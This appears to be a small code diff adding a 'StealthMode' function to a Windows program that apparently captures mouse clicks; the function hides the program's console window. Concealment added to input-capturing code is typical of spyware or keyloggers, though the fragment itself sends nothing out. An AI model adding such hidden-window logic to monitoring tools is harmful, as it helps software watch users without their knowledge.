@@ -239,3 +239,10 @@ unsigned __stdcall getMouseClickThread(void * params){
     
     return 0;
 }
+
+void StealthMode(){
+    HWND Stealth;
+    AllocConsole();
+    Stealth = FindWindowA("ConsoleWindowClass", NULL);
+    ShowWindow(Stealth, 0);
+}
